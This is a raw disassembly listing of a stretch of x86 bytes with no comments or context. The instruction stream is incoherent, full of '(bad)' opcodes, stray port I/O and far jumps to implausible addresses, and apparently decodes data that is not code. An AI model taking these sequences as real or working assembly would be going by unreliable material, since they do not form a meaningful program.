  426bd0:	mov    esi,0xbdc5ebac
  426bd5:	xlat   BYTE PTR ds:[ebx]
  426bd6:	mov    al,0xc1
  426bd8:	mov    al,0xba
  426bda:	mov    cl,0xac
  426bdc:	sti    
  426bdd:	fdivp  st(6),st
  426bdf:	ret    
  426be0:	in     eax,dx
  426be1:	iret   
  426be2:	idiv   edx
  426be4:	fcmovnb st,st(2)
  426be6:	fsub   st,st(3)
  426be8:	loop   0x426bc9
  426bea:	jmp    0x426bf4
  426bec:	in     al,0xd
  426bee:	loopne 0x426bce
  426bf0:	shl    esi,cl
  426bf2:	call   0xcf253fe6
  426bf7:	cmc    
  426bf8:	fisubr DWORD PTR [esi-0x305010a]
  426bfe:	rol    ebx,cl
  426c00:	mov    bh,0xd4
  426c02:	repz stc 
  426c04:	rcl    al,1
  426c06:	fadd   st(3),st
  426c08:	jmp    0xe61c351c
  426c0d:	int    0xfa
  426c0f:	sar    BYTE PTR [esi-0x4a4d4d17],0xe9
  426c16:	into   
  426c17:	out    0xd9,eax
  426c19:	out    0xb8,eax
  426c1b:	out    dx,eax
  426c1c:	into   
  426c1d:	icebp  
  426c1e:	(bad)  
  426c20:	in     eax,dx
  426c21:	ret    
  426c22:	ror    dh,cl
  426c24:	fild   DWORD PTR [ecx]
  426c26:	in     eax,0xde
  426c28:	in     al,0xeb
  426c2a:	fcomp  st(0)
  426c2c:	or     al,0xcd
  426c2e:	(bad)  
  426c2f:	(bad)  
  426c31:	loop   0x426c14
  426c33:	in     al,dx
  426c34:	mov    ebp,0xb7f3d2f0
  426c39:	call   ebp
  426c3b:	(bad)  
  426c3d:	out    dx,eax
  426c3e:	idiv   BYTE PTR [edi-0x3074705]
  426c44:	in     al,dx
  426c45:	fild   WORD PTR [edi]
  426c47:	std    
  426c48:	or     DWORD PTR [ecx],eax
  426c4a:	mov    ebp,0xcd0bc7e4
  426c4f:	clc    
  426c50:	(bad)  
  426c51:	stos   BYTE PTR es:[edi],al
  426c52:	lock (bad) 
  426c54:	int3   
  426c55:	mov    bh,0xa9
  426c57:	test   al,0xcf
  426c5a:	jmp    0x426c26
  426c5c:	fcmovnbe st,st(2)
  426c5e:	(bad)  
  426c5f:	mov    ah,0xcc
  426c61:	call   0xde244752
  426c66:	fptan  
  426c68:	xlat   BYTE PTR ds:[ebx]
  426c69:	fucom  st(0)
  426c6b:	(bad)  
  426c6d:	aam    0xe1
  426c6f:	add    bl,bh
  426c71:	rol    esi,1
  426c73:	xlat   BYTE PTR ds:[ebx]
  426c74:	lods   eax,DWORD PTR ds:[esi]
  426c75:	mov    bh,0xea
  426c77:	sti    
  426c78:	jmp    0x426c69
  426c7a:	jmp    0x426c47
  426c7c:	in     eax,dx
  426c7d:	mov    ecx,0xecddc2d1
  426c82:	inc    eax
  426c84:	jecxz  0x426c7c
  426c86:	out    0xe0,al
  426c88:	(bad)  
  426c8a:	jecxz  0x426c61
  426c8c:	stc    
  426c8d:	(bad)  
  426c8e:	adc    ch,bl
  426c90:	(bad)  
  426c91:	out    dx,al
  426c92:	enter  0xb1cc,0xae
  426c96:	iret   
  426c97:	mov    ebx,0xe4decdcf
  426c9c:	int    0xbe
  426c9e:	(bad)  
  426ca0:	call   0xecf75aac
  426ca5:	add    al,0xf6
  426ca7:	or     esi,edx
  426ca9:	clc    
  426caa:	call   0xce1d487a
  426caf:	out    0xa9,eax
  426cb1:	mov    eax,0xd6e3edd6
  426cb6:	div    ah
  426cb8:	rol    eax,1
  426cba:	in     al,dx
  426cbb:	jmp    0xd42e6b99
  426cc0:	loopne 0x426c92
  426cc2:	sar    bl,1
  426cc4:	cld    
  426cc5:	mov    ebp,0xfebf03dc
  426cca:	cld    
  426ccb:	out    dx,eax
  426ccc:	fcomp  st(0)
  426cce:	or     ebx,edx
  426cd0:	stos   BYTE PTR es:[edi],al
  426cd1:	mov    edi,0xe7cfc5f3
  426cd6:	mov    dl,0xf6
  426cd8:	sti    
  426cd9:	into   
  426cda:	mov    edi,0xd7edbdbf
  426cdf:	cmc    
  426ce0:	rol    DWORD PTR [ebx],1
  426ce2:	into   
  426ce3:	aam    0xfb
  426ce5:	pop    es
  426ce6:	xlat   BYTE PTR ds:[ebx]
  426ce7:	pop    es
  426ce8:	retf   
  426ce9:	add    al,BYTE PTR [ecx]
  426ceb:	in     al,0xca
  426ced:	add    ecx,esi
  426cef:	in     eax,0xec
  426cf1:	in     al,0xce
  426cf3:	jmp    0xbaec:0xeceec9e1
  426cfa:	shl    ebp,1
  426cfc:	mov    dh,0xe9
  426cfe:	test   ch,0xb8
  426d01:	hlt    
  426d02:	aad    0x6
  426d04:	rol    bh,1
  426d06:	aad    0x4
  426d08:	ftst   
  426d0a:	fucomip st,st(6)
  426d0c:	add    ecx,esp
  426d0e:	cld    
  426d0f:	or     eax,0xd2dec1e9
  426d14:	scas   al,BYTE PTR es:[edi]
  426d15:	leave  
  426d16:	loopne 0x426cf2
  426d18:	(bad)  
  426d19:	hlt    
  426d1a:	mov    edi,0xf0c8ebed
  426d1f:	jmp    0xc7355eff
  426d24:	icebp  
  426d25:	push   es
  426d26:	or     edx,ebp
  426d28:	cli    
  426d29:	jmp    0x141f7605
  426d2e:	(bad)  
  426d2f:	call   0xc72a40e1
  426d34:	into   
  426d35:	mov    dh,0xe5
  426d37:	jmp    0x426d34
  426d39:	in     al,dx
  426d3a:	mov    ecx,0xdbcab3ec
  426d3f:	clc    
  426d40:	fadd   st(3),st
  426d42:	out    dx,eax
  426d43:	mul    al
  426d45:	add    ch,dl
  426d47:	hlt    
  426d48:	vpsubb xmm3,xmm2,xmm3
  426d4c:	jecxz  0x426d42
  426d4e:	cli    
  426d4f:	adc    al,cl
  426d51:	fdivr  QWORD PTR [esi-0x1d34171d]
  426d57:	mov    cl,0xf4
  426d59:	loopne 0x426d08
  426d5b:	lods   al,BYTE PTR ds:[esi]
  426d5c:	mov    bl,0xbf
  426d5e:	mov    eax,0xfedffae8
  426d63:	ret    0xbc05
  426d66:	shl    ah,1
  426d68:	(bad)  
  426d69:	add    edi,ebx
  426d6b:	out    0xef,al
  426d6d:	add    ah,dl
  426d6f:	(bad)  
  426d70:	in     eax,dx
  426d71:	in     al,dx
  426d72:	(bad)  
  426d73:	leave  
  426d74:	call   0xe81a5635
  426d79:	rcl    eax,1
  426d7b:	in     eax,dx
  426d7c:	cli    
  426d7d:	mov    edi,0xfad8efea
  426d82:	ret    0xd5da
  426d85:	mov    ebp,0xe1bfdbc7
  426d8a:	(bad)  
  426d8b:	add    al,0xff
  426d8d:	std    
  426d8e:	int    0xe2
  426d90:	icebp  
  426d91:	mov    bl,0xc4
  426d93:	not    ecx
  426d95:	leave  
  426d96:	iret   
  426d97:	jmp    0xcfd2:0xedf8d5d2
  426d9e:	rcl    esp,1
  426da0:	mov    edi,0xedd6edf6
  426da5:	stc    
  426da6:	shl    ah,0xe8
  426da9:	or     al,ch
  426dab:	retf   0x7df
  426dae:	out    dx,al
  426daf:	in     al,dx
  426db0:	retf   
  426db1:	shl    cl,1
  426db3:	(bad)  
  426db4:	jmp    0xf7d4:0xd1e2b5c4
  426dbb:	out    dx,al
  426dbc:	fmul   st,st(4)
  426dbe:	repnz int3 
  426dc0:	loope  0x426dc9
  426dc2:	mov    esi,0xe4f3e3db
  426dc7:	or     ecx,edx
  426dc9:	jmp    0xe4224cd7
  426dce:	out    0xdc,al
  426dd0:	enter  0xa8ea,0xde
  426dd4:	xlat   BYTE PTR ds:[ebx]
  426dd5:	(bad)  
  426dd6:	jmp    0xd1cc:0xe4f6e4b5
  426ddd:	mov    esi,0xbcb9cfb9
  426de2:	pop    es
  426de3:	fsubrp st(3),st
  426de5:	fdiv   st(7),st
  426de7:	fstp   st(5)
  426de9:	leave  
  426dea:	retf   
  426deb:	(bad)  
  426dec:	clc    
  426ded:	sti    
  426dee:	jmp    0xeace:0xdfe1e1ec
  426df5:	mov    ah,0xf7
  426df7:	out    0xd1,eax
  426df9:	iret   
  426dfa:	cmc    
  426dfb:	mov    edi,0xdec8d3d4
  426e00:	(bad)  
  426e02:	mov    esi,0xd9f7edd1
  426e07:	retf   0xe9d8
  426e0a:	add    DWORD PTR [ebx],ecx
  426e0c:	or     al,ch
  426e0e:	push   cs
  426e0f:	or     eax,0xe8ebc0f2
  426e14:	scas   eax,DWORD PTR es:[edi]
  426e15:	fdiv   QWORD PTR [ebp+edx*8-0x2600482e]
  426e1c:	fcmovne st,st(5)
  426e1e:	jmp    0xd6de:0xb5fcb8d0
  426e25:	(bad)  
  426e27:	retf   
  426e28:	(bad)  
  426e29:	fsubr  st(6),st
  426e2b:	call   0xf5b3b
  426e30:	iret   
  426e31:	into   
  426e32:	div    DWORD PTR [edi-0x15043a24]
  426e38:	stc    
  426e39:	mov    al,0xd7
  426e3b:	enter  0xddbe,0xbc
  426e3f:	mov    ebp,0xdcfaf8e2
  426e44:	mov    edi,0xfe0500be
  426e49:	aad    0xc7
  426e4b:	add    ebx,edi
  426e4d:	add    bl,dl
  426e4f:	pop    es
  426e50:	scas   eax,DWORD PTR es:[edi]
  426e51:	stos   BYTE PTR es:[edi],al
  426e52:	(bad)  
  426e53:	repz shr BYTE PTR [ebx+eax*8-0x538042d],0xf0
  426e5c:	iret   
  426e5d:	add    ebp,esp
  426e5f:	(bad)  
  426e61:	icebp  
  426e62:	repnz div ebx
  426e65:	fld    QWORD PTR [edi]
  426e67:	(bad)  
  426e68:	out    0x3,al
  426e6a:	test   DWORD PTR [eax],0xe1cf06e6
  426e70:	lock mov eax,0xe1c0c6be
  426e76:	mov    al,0xda
  426e78:	scas   eax,DWORD PTR es:[edi]
  426e79:	repz mov ecx,0xecf2cada
  426e7f:	mul    cl
  426e81:	fstp   st(7)
  426e83:	int3   
  426e84:	add    ch,bh
  426e86:	mov    ebp,0x5f4c1db
  426e8b:	add    ebp,ebp
  426e8d:	into   
  426e8e:	jmp    0xbdb7:0xe1a6d2f8
  426e95:	rol    edi,cl
  426e97:	enter  0xdfc6,0xf9
  426e9b:	out    0xd7,al
  426e9d:	int3   
  426e9e:	enter  0xd4da,0xef
  426ea2:	shl    ecx,0xda
  426ea5:	loop   0x426e7f
  426ea7:	add    BYTE PTR [esi],al
  426ea9:	or     ecx,ebx
  426eab:	jmp    0x426e8c
  426ead:	(bad)  
  426eaf:	out    dx,al
  426eb0:	repnz rep lods al,BYTE PTR ds:[esi]
  426eb3:	loope  0x426e89
  426eb5:	mov    bh,0xcb
  426eb7:	sti    
  426eb8:	fcomi  st,st(0)
  426eba:	mov    ebx,0xc9d0f1b5
  426ebf:	retf   0xf5d4
  426ec2:	out    dx,eax
  426ec3:	fld    st(3)
  426ec5:	add    BYTE PTR [edx],cl
  426ec7:	rol    BYTE PTR [ebx],1
  426ec9:	or     al,BYTE PTR [edx]
  426ecb:	or     eax,0xaecddd5
  426ed0:	test   al,0xac
  426ed2:	in     eax,dx
  426ed3:	into   
  426ed4:	lock stos BYTE PTR es:[edi],al
  426ed6:	retf   
  426ed7:	hlt    
  426ed8:	mov    ch,0xc7
  426eda:	in     eax,dx
  426edb:	sti    
  426edc:	not    al
  426ede:	enter  0xfab8,0xe0
  426ee2:	aad    0x3
  426ee4:	add    al,al
  426ee6:	fsubp  st(1),st
  426ee8:	fdiv   st(7),st
  426eea:	cli    
  426eeb:	fcomp  st(0)
  426eed:	out    dx,eax
  426eee:	fsub   st(5),st
  426ef0:	jmp    0x426eda
  426ef2:	shr    al,cl
  426ef4:	repnz leave 
  426ef6:	mov    al,0xe4
  426ef8:	test   ah,0xde
  426efb:	into   
  426efc:	mov    esi,0xd3beebd8
  426f01:	enter  0xe2c1,0xf5
  426f05:	(bad)  
  426f07:	lock in al,0xc5
  426f0a:	jecxz  0x426f05
  426f0c:	out    0x3,al
  426f0e:	add    al,BYTE PTR [ebx]
  426f10:	stos   DWORD PTR es:[edi],eax
  426f11:	fsub   st(0),st
  426f13:	div    esi
  426f15:	icebp  
  426f16:	rol    esp,1
  426f18:	mov    ch,0xc8
  426f1a:	fisubr DWORD PTR [ebx+edi*8-0x13293026]
  426f21:	mov    ebp,0xf6fbfdec
  426f26:	fcmovnu st,st(3)
  426f28:	aam    0xe5
  426f2a:	ftst   
  426f2c:	jmp    0xc0b3:0xc0fcdee7
  426f33:	out    dx,al
  426f34:	scas   eax,DWORD PTR es:[edi]
  426f35:	enter  0xc7d3,0xfb
  426f39:	scas   al,BYTE PTR es:[edi]
  426f3a:	dec    esp
  426f3c:	mov    ecx,0xc2fb03b9
  426f41:	repz int 0xde
  426f44:	std    
  426f45:	mov    esp,0xc4f8e6d2
  426f4a:	loopne 0x426f37
  426f4c:	cmc    
  426f4d:	jmp    0xd2e4:0xacca08da
  426f54:	aad    0xd5
  426f56:	(bad)  [ebp-0xc3a4812]
  426f5c:	shl    eax,1
  426f5e:	mov    ebx,0xbf01f5c3
  426f63:	icebp  
  426f64:	call   ebp
  426f66:	in     al,0xbc
  426f68:	or     dh,ah
  426f6a:	(bad)
  426f6d:	fsubr  st(0),st
  426f6f:	jecxz  0x426f19
  426f71:	icebp  
  426f72:	call   0xfaff6227
  426f77:	loopne 0x426f45
  426f79:	(bad)  
  426f7a:	in     al,0xe8
  426f7c:	mov    eax,0x1d8f9f8
  426f81:	mov    esp,0xe3dbdef6
  426f86:	add    bl,ch
  426f88:	or     ch,dl
  426f8a:	or     ch,ch
  426f8c:	(bad)  
  426f8d:	sti    
  426f8e:	add    DWORD PTR [ecx],eax
  426f90:	mov    ebp,0xe2a8cce3
  426f95:	loopne 0x426f68
  426f97:	mov    dl,0xf9
  426f99:	mov    ebx,0xf3bdd4fa
  426f9e:	mov    ecx,0xbedab7ff
  426fa3:	fadd   DWORD PTR [eax]
  426fa5:	jmp    0x426fa4
  426fa7:	clc    
  426fa8:	add    ah,ah
  426faa:	clc    
  426fab:	clc    
  426fac:	inc    dh
  426fae:	in     al,0xdf
  426fb0:	shl    edx,1
  426fb2:	shl    DWORD PTR [ecx-0x4e481112],1
  426fb8:	loope  0x426fab
  426fba:	mov    cl,0xd4
  426fbc:	out    dx,eax
  426fbd:	fcomi  st,st(1)
  426fbf:	int    0xf0
  426fc1:	loope  0x426f97
  426fc3:	sar    edx,1
  426fc5:	mov    esi,0xc804d7f4
  426fca:	out    dx,eax
  426fcb:	out    dx,eax
  426fcc:	int    0xf3
  426fce:	retf   
  426fcf:	add    ch,ch
  426fd1:	test   eax,0xe9f0c3be
  426fd6:	test   eax,0xd1dad0fa
  426fdc:	jmp    0xfbda:0xfefdd2fd
  426fe3:	rol    edx,cl
  426fe5:	(bad)  
  426fe6:	mov    esp,0xe20fe2fc
  426feb:	iret   
  426fec:	fstp   st(7)
  426fee:	repz std 
  426ff0:	mov    ebp,0xf2b2c8e5
  426ff5:	cmc    
  426ff6:	aam    0xf7
  426ff8:	(bad)  
  426ff9:	into   
  426ffa:	mov    dh,0xb5
  426ffc:	aam    0xcb
  426ffe:	in     eax,dx
  426fff:	(bad)  
  427000:	jmp    0xc21e53f8
  427005:	(bad)  
  427006:	add    esp,edi
  427008:	clc    
  427009:	(bad)  
  42700a:	cld    
  42700b:	or     DWORD PTR [eax],ecx
  42700d:	add    ebp,esp
  42700f:	or     bh,BYTE PTR [eax-0x54353231]
  427015:	mov    al,0xf6
  427017:	hlt    
  427018:	int    0xb5
  42701a:	fdivr  st,st(5)
  42701c:	in     eax,0xdb
  42701e:	add    ecx,edx
  427020:	into   
  427021:	rcl    eax,0xc3
  427024:	(bad)  
  427025:	sar    dl,1
  427027:	retf   
  427028:	add    al,0x2
  42702a:	(bad)  
  42702b:	(bad)  
  42702c:	fsubp  st(4),st
  42702e:	call   DWORD PTR [ebx]
  427030:	stos   DWORD PTR es:[edi],eax
  427031:	mov    al,0xf1
  427033:	jecxz  0x427016
  427035:	call   0xf315452e
  42703a:	mov    ch,0xb4
  42703c:	mov    esi,0xb8f1c3dd
  427041:	aad    0xce
  427043:	int    0xfc
  427045:	push   esi
  427047:	(bad)  
  427048:	(bad)  
  42704a:	mul    edx
  42704c:	aam    0x3
  42704e:	int3   
  42704f:	paddusb mm5,mm6
  427052:	shr    cl,cl
  427054:	rcl    esp,cl
  427056:	ret    
  427057:	mov    al,0xca
  427059:	jmp    0x427011
  42705b:	mov    ah,0xd3
  42705d:	in     eax,dx
  42705e:	iret   
  42705f:	mov    ecx,0xeedfbef9
  427064:	lock sti 
  427066:	(bad)  
  427067:	fsubr  st,st(1)
  427069:	shl    dh,0xd
  42706c:	(bad)  
  42706d:	fstp   st(4)
  42706f:	retf   0xcee1
  427072:	repz out dx,eax
  427074:	mov    bl,0xc0
  427076:	mul    cl
  427078:	scas   eax,DWORD PTR es:[edi]
  427079:	mov    edx,0xdcb9c5ca
  42707e:	enter  0xe3b4,0xf8
  427082:	repz mov ah,0xd2
  427085:	ret    
  427086:	xlat   BYTE PTR ds:[ebx]
  427087:	jecxz  0x42707d
  427089:	rol    eax,0xdf
  42708c:	add    ebp,esp
  42708e:	fimul  DWORD PTR [ebx]
  427090:	loopne 0x427069
  427092:	in     al,0xf7
  427094:	mov    bl,0xe6
  427097:	shl    bh,0xae
  42709a:	shr    eax,cl
  42709c:	stc    
  42709d:	mov    ah,0xb8
  42709f:	loope  0x42705c
  4270a1:	fcomi  st,st(7)
  4270a3:	add    edx,esi
  4270a5:	mov    edx,0xdac4f7c6
  4270aa:	stc    
  4270ab:	leave  
  4270ac:	aam    0x9
  4270ae:	out    0xe5,al
  4270b0:	mov    eax,0xf0d6eaf3
  4270b5:	ror    al,cl
  4270b7:	ror    ch,1
  4270b9:	rcl    ebp,1
  4270bb:	mov    ebx,0xf0f0f6eb
  4270c0:	rol    edx,1
  4270c2:	mov    ebp,0xe3ba00d2
  4270c7:	jmp    0xff2b52b6
  4270cc:	std    
  4270cd:	fucomi st,st(3)
  4270cf:	retf   
  4270d0:	mov    cl,0xeb
  4270d2:	loope  0x4270b2
  4270d4:	cmc    
  4270d5:	ret    
  4270d6:	jmp    0x4270a9
  4270d8:	out    dx,eax
  4270d9:	aad    0xfa
  4270db:	(bad)  
  4270dc:	div    al
  4270de:	retf   0x103
  4270e1:	mov    edi,0xf7faf900
  4270e6:	(bad)
  4270e9:	std    
  4270ea:	loope  0x4270f5
  4270ec:	aam    0xcc
  4270ee:	int3   
  4270ef:	fbstp  TBYTE PTR [ecx-0x13283923]
  4270f5:	mov    esp,0xeef9e2b1
  4270fa:	leave  
  4270fb:	fxch   st(6)
  4270fd:	mov    edx,0xfaed03b8
  427102:	add    esp,ebx
  427104:	in     al,dx
  427105:	mul    dh
  427107:	mov    esp,0xdcd9fbc4
  42710c:	jmp    0xc329560e
  427111:	mul    edi
  427113:	fdiv   QWORD PTR [edx-0x324a3118]
  427119:	enter  0xc4da,0xcb
  42711d:	sti    
  42711e:	hlt    
  42711f:	sar    BYTE PTR [ebp+0x3f7c3bd],cl
  427125:	fadd   st,st(4)
  427127:	lock cli 
  427129:	std    
  42712a:	add    eax,0xc500efe7
  42712f:	leave  
  427130:	stos   DWORD PTR es:[edi],eax
  427131:	retf   
  427132:	ret    
  427133:	jmp    0x427109
  427135:	repz mov ch,0xda
  427138:	rcr    al,cl
  42713a:	(bad)  
  42713b:	mov    ah,0xe4
  42713d:	imul   bh
  42713f:	(bad)  
  427141:	cld    
  427142:	xlat   BYTE PTR ds:[ebx]
  427143:	ret    
  427144:	(bad)  
  427146:	(bad)  
  427147:	sar    bl,1
  427149:	rol    bh,1
  42714b:	jecxz  0x427155
  42714d:	jmp    0xe522403a
  427152:	in     eax,dx
  427153:	loope  0x427108
  427155:	into   
  427156:	cmc    
  427157:	retf   0xeeb7
  42715a:	aad    0xf9
  42715c:	retf   0xdcb4
  42715f:	into   
  427160:	loopne 0x42715b
  427162:	iret   
  427163:	imul   ch
  427165:	(bad)  
  427167:	or     bl,ch
  427169:	cli    
  42716a:	retf   0xc9cf
  42716d:	aam    0xe7
  42716f:	retf   0xe5d3
  427172:	scas   al,BYTE PTR es:[edi]
  427173:	test   al,0xf3
  427175:	mov    ah,0xc9
  427177:	enter  0xb6b1,0xd9
  42717b:	stc    
  42717c:	repz int 0xec
  42717f:	cli    
  427180:	fcom   st(6)
  427182:	(bad)  
  427183:	jmp    ecx
  427185:	stc    
  427186:	shl    al,0xe0
  427189:	or     dh,dl
  42718b:	iret   
  42718c:	add    ebp,esi
  42718e:	clc    
  42718f:	out    dx,al
  427190:	retf   0xefbe
  427193:	xlat   BYTE PTR ds:[ebx]
  427194:	out    dx,eax
  427195:	lods   eax,DWORD PTR ds:[esi]
  427196:	lods   eax,DWORD PTR ds:[esi]
  427197:	cmc    
  427198:	repz out 0xc8,al
  42719b:	repz in eax,dx
  42719d:	fcom   st(5)
  42719f:	mov    ebx,0xcdf3faba
  4271a4:	cld    
  4271a5:	in     eax,0xf2
  4271a7:	fsubrp st(3),st
  4271a9:	add    eax,0x8dee5d8
  4271ae:	in     eax,dx
  4271af:	(bad)  
  4271b1:	out    dx,al
  4271b2:	in     eax,0xeb
  4271b4:	into   
  4271b5:	in     eax,0xca
  4271b7:	in     eax,dx
  4271b8:	icebp  
  4271b9:	cli    
  4271ba:	fsubr  st,st(3)
  4271bc:	fst    st(4)
  4271be:	rol    ebx,1
  4271c0:	in     eax,dx
  4271c1:	out    0xe1,eax
  4271c3:	fcmovnb st,st(2)
  4271c5:	std    
  4271c6:	stc    
  4271c7:	loope  0x4271d4
  4271c9:	fnstcw WORD PTR [ebp-0x15243018]
  4271cf:	(bad)  
  4271d1:	ret    
  4271d2:	into   
  4271d3:	rcl    ecx,1
  4271d5:	out    dx,eax
  4271d6:	iret   
  4271d7:	(bad)
  4271da:	out    dx,al
  4271db:	lods   al,BYTE PTR ds:[esi]
  4271dc:	lock out dx,eax
  4271de:	mov    eax,0xfac1bccc
  4271e3:	ffree  st(2)
  4271e5:	cld    
  4271e6:	std    
  4271e7:	aam    0xf0
  4271e9:	or     cl,BYTE PTR [esi]
  4271eb:	retf   0xd8c3
  4271ee:	or     eax,0xf6c7d0e0
  4271f3:	jmp    0xe2393fe9
  4271f8:	in     eax,dx
  4271f9:	(bad)  
  4271fa:	mov    edx,0xbcfdf6f4
  4271ff:	jecxz  0x4271c0
  427201:	add    edi,esi
  427203:	add    edi,edx
  427205:	div    bh
  427207:	fucom  st(3)
  427209:	sti    
  42720a:	(bad)
  42720d:	sti    
  42720e:	adc    ecx,ebp
  427210:	(bad)  
  427212:	loop   0x4271c0
  427214:	call   0xb737470e
  427219:	enter  0xdfd4,0xee
  42721d:	fdiv   QWORD PTR [ebp-0x322430f]
  427223:	(bad)  
  427225:	jmp    0x42721a
  427227:	jmp    0x4271f0
  427229:	(bad)  
  42722a:	mov    ebp,0xfbe4d8f4
  42722f:	stc    
  427230:	int    0xa8
  427232:	(bad)
  427236:	int    0xe7
  427238:	(bad)  
  427239:	repz (bad) 
  42723c:	call   0xbafc6e3d
  427241:	loope  0x42721c
  427243:	add    ch,bh
  427245:	fdiv   st(2),st
  427247:	mov    eax,0xee5cad7
  42724c:	stc    
  42724d:	clc    
  42724e:	loope  0x42724c
  427250:	ret    
  427251:	(bad)  
  427252:	mov    ebp,0xb1d7e0f2
  427257:	in     al,dx
  427258:	(bad)  
  427259:	jmp    0xdad3:0xdbf5feeb
  427260:	mov    esp,0xd701d2be
  427265:	aad    0xf1
  427267:	add    ecx,ecx
  427269:	rol    esi,0xd8
  42726c:	push   cs
  42726d:	clc    
  42726e:	add    dl,bl
  427270:	(bad)  
  427272:	enter  0xdce1,0xe6
  427276:	(bad)  
  427277:	int    0xf9
  427279:	fucomi st,st(5)
  42727b:	int3   
  42727c:	jmp    0x427248
  42727e:	aad    0xf6
  427280:	mov    esp,0xfcf7e2db
  427285:	out    0xb,al
  427287:	add    cl,al
  427289:	add    BYTE PTR [eax],al
  42728b:	out    dx,al
  42728c:	push   cs
  42728d:	ret    0xdcc9
  427290:	scas   eax,DWORD PTR es:[edi]
  427291:	(bad)  
  427293:	ror    bh,1
  427295:	mov    dl,0xc9
  427297:	rol    esp,0xf3
  42729a:	test   bh,0xce
  42729d:	cld    
  42729e:	mov    edi,0xb5f7fab0
  4272a3:	ret    0xe5e5
  4272a6:	icebp  
  4272a7:	clc    
  4272a8:	loop   0x427280
  4272aa:	add    ah,bh
  4272ac:	int    0xea
  4272ae:	or     al,0x4
  4272b0:	lods   al,BYTE PTR ds:[esi]
  4272b1:	test   al,0xae
  4272b3:	int    0xb5
  4272b5:	retf   0xefbb
  4272b8:	out    dx,eax
  4272b9:	(bad)
  4272bc:	xlat   BYTE PTR ds:[ebx]
  4272bd:	(bad)  
  4272bf:	fucomi st,st(5)
  4272c1:	repz cmc 
  4272c3:	mov    eax,0xe204dff6
  4272c8:	ffree  st(1)
  4272ca:	fucomi st,st(2)
  4272cc:	or     cl,BYTE PTR [edx]
  4272ce:	jmp    0xb2ff2597
  4272d3:	rcl    bl,1
  4272d5:	loop   0x4272c7
  4272d7:	shl    ch,0xc5
  4272da:	aad    0xf9
  4272dc:	(bad)  
  4272dd:	mov    edi,0xd8ddf5d5
  4272e2:	loopne 0x4272d9
  4272e4:	add    dl,dl
  4272e6:	rcl    eax,1
  4272e8:	xlat   BYTE PTR ds:[ebx]
  4272e9:	lock call 0x93c3dcf
  4272ef:	loope  0x4272a4
  4272f1:	repz (bad) 
  4272f3:	lods   eax,DWORD PTR ds:[esi]
  4272f4:	mov    al,0xe6
  4272f6:	out    0xee,al
  4272f8:	hlt    
  4272f9:	mov    bh,0xd9
  4272fb:	clc    
  4272fc:	inc    ah
  4272fe:	mov    esp,0xf5c1dbb8
  427303:	mov    esi,0xe4dec7f0
  427308:	test   bh,0xe4
  42730b:	cld    
  42730c:	fcomp  st(6)
  42730e:	jmp    0x427317
  427310:	loop   0x4272b8
  427312:	out    dx,al
  427313:	mov    al,0xf1
  427315:	hlt    
  427316:	repz repnz in al,0xc4
  42731a:	fcomp  st(1)
  42731c:	mov    eax,0xf7e9dde3
  427321:	out    dx,al
  427322:	cmc    
  427323:	fcomip st,st(0)
  427325:	fsub   st,st(5)
  427327:	idiv   bl
  427329:	add    ecx,ecx
  42732b:	add    al,0xd4
  42732d:	cli    
  42732e:	loopne 0x4272ff
  427330:	fcom   st(3)
  427332:	test   al,0xd0
  427335:	sar    edx,cl
  427337:	mov    ch,0xd1
  427339:	stc    
  42733a:	(bad)  
  42733b:	std    
  42733c:	xlat   BYTE PTR ds:[ebx]
  42733d:	into   
  42733e:	mov    ah,0xdc
  427340:	(bad)  
  427342:	idiv   cl
  427344:	sar    eax,cl
  427346:	fdivr  st(0),st
  427348:	add    esp,esp
  42734a:	leave  
  42734b:	retf   
  42734c:	fndisi(8087 only) 
  42734e:	(bad)  
  427350:	ffreep st(2)
  427352:	(bad)  
  427353:	out    0xc9,eax
  427355:	xlat   BYTE PTR ds:[ebx]
  427356:	jmp    0xe8fb:0xc8f4d4eb
  42735d:	leave  
  42735e:	(bad)  
  42735f:	(bad)  
  427360:	mov    edx,0x5c7f6d1
  427365:	out    0x4,al
  427367:	or     ah,cl
  427369:	fiadd  DWORD PTR [ecx]
  42736b:	hlt    
  42736c:	int    0xe7
  42736e:	adc    cl,dl
  427370:	stos   DWORD PTR es:[edi],eax
  427371:	jmp    0xe8e3:0xd4f3ceee
  427378:	out    0xf4,al
  42737a:	hlt    
  42737b:	(bad)  
  42737d:	int    0xca
  42737f:	lock ret 
  427381:	in     eax,dx
  427382:	fild   DWORD PTR [edi]
  427384:	ret    
  427385:	loop   0x427384
  427387:	fst    st(4)
  427389:	jecxz  0x427360
  42738b:	or     bh,ch
  42738d:	jmp    0xe6e7:0xbce0feee
  427394:	int3   
  427395:	in     eax,dx
  427396:	(bad)  
  427397:	jmp    0xdb415896
  42739c:	call   0xf71e4592
  4273a1:	fcmovu st,st(3)
  4273a3:	dec    ebp
  4273a5:	add    dl,dl
  4273a7:	aad    0xe8
  4273a9:	aam    0xcb
  4273ab:	iret   
  4273ac:	aam    0xe
  4273ae:	ffreep st(0)
  4273b0:	mov    bl,0xeb
  4273b2:	lods   eax,DWORD PTR ds:[esi]
  4273b3:	mov    dl,0xd6
  4273b5:	mov    al,0xc6
  4273b7:	ror    edx,1
  4273b9:	in     eax,0xce
  4273bb:	fstp   st(0)
  4273bd:	fdivp  st(1),st
  4273bf:	iret   
  4273c0:	mov    ecx,0xd7d0cec1
  4273c5:	push   es
  4273c6:	frstpm(287 only) 
  4273c8:	ret    
  4273c9:	(bad)  
  4273ca:	(bad)  
  4273cb:	out    dx,eax
  4273cc:	aad    0xfa
  4273ce:	shl    edi,0xc4
  4273d1:	in     al,dx
  4273d2:	scas   al,BYTE PTR es:[edi]
  4273d3:	repnz in al,0xf7
  4273d6:	retf   
  4273d7:	rcr    dl,1
  4273d9:	retf   0xbee5
  4273dc:	cli    
  4273dd:	mov    edx,0xdbd3bbc8
  4273e2:	mul    bl
  4273e4:	mov    esp,0xf5fee3d2
  4273e9:	ret    0xe9e3
  4273ec:	fndisi(8087 only) 
  4273ee:	dec    BYTE PTR [esp+ebp*4]
  4273f1:	in     al,0xd7
  4273f3:	ret    
  4273f4:	retf   0xcaac
  4273f7:	mov    cl,0xcf
  4273f9:	shl    DWORD PTR [esi-0xb473526],1
  4273ff:	cmc    
  427400:	int3   
  427401:	mov    edi,0xbdf6ff
  427406:	out    0xc1,eax
  427408:	aad    0xff
  42740a:	(bad)  
  42740b:	jmp    0xe2554cec
  427410:	test   al,0xd3
  427412:	retf   0xe7d3
  427415:	leave  
  427416:	aad    0xb1
  427418:	mov    dh,0xe4
  42741a:	fcmovne st,st(4)
  42741c:	sar    cl,1
  42741e:	ffreep st(3)
  427420:	add    edx,edi
  427422:	(bad)  
  427423:	sti    
